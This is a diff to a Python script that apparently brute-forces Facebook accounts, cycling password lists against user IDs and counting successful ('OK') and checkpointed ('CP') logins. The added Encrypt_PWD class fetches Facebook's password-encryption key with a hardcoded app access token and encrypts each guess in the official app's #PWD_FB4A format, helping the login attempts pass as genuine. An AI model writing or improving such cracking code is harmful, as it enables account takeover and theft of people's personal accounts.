@@ -1451,10 +1451,10 @@ def p(uid,pwx,tl):
     sys.stdout.write(f"\r {green}(M2) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
-        for pw in pwx:
+        for password in pwx:
             data = {
             'email': uid,
-            'password': pw,
+            'password': Encrypt_PWD().PWD_FB4A(password),
             'adid': str(uuid.uuid4()),
             'device_id': str(uuid.uuid4()),
             'family_device_id': str(uuid.uuid4()),
@@ -2286,6 +2286,49 @@ def cracker(uid, pwx, tl):
     except Exception as error:
         #print({error})
         pass
+
+class Encrypt_PWD:
+    def __init__(self) -> None:
+        pass
+        
+    def PWD_FB4A(self, password, public_key=None, key_id="25"):
+        if public_key is None:
+            try:
+                pwd_key_fetch = 'https://b-graph.facebook.com/pwd_key_fetch'
+                pwd_key_fetch_data = {
+                    'version': '2',
+                    'flow': 'CONTROLLER_INITIALIZATION',
+                    'method': 'GET',
+                    'fb_api_req_friendly_name': 'pwdKeyFetch',
+                    'fb_api_caller_class': 'com.facebook.auth.login.AuthOperations',
+                    'access_token': '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
+                }
+                response = requests.post(pwd_key_fetch, params=pwd_key_fetch_data).json()
+                public_key = response.get('public_key')
+                key_id = str(response.get('key_id', key_id))
+            except Exception as e:
+                return (f"API: {str(e).title()}")
+        try:
+            rand_key = get_random_bytes(32) 
+            iv = get_random_bytes(12)
+            pubkey = RSA.import_key(public_key)
+            cipher_rsa = PKCS1_v1_5.new(pubkey)
+            encrypted_rand_key = cipher_rsa.encrypt(rand_key)
+            cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
+            current_time = int(time.time())
+            cipher_aes.update(str(current_time).encode("utf-8"))
+            encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
+            buf = io.BytesIO()
+            buf.write(bytes([1, int(key_id)]))
+            buf.write(iv)
+            buf.write(struct.pack("<h", len(encrypted_rand_key)))
+            buf.write(encrypted_rand_key)
+            buf.write(auth_tag) 
+            buf.write(encrypted_passwd)
+            encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
+            return f"#PWD_FB4A:2:{current_time}:{encoded}"
+        except (Exception) as e:
+            return(f"{str(e).title()}")
 
 os.system("clear")
 Process()
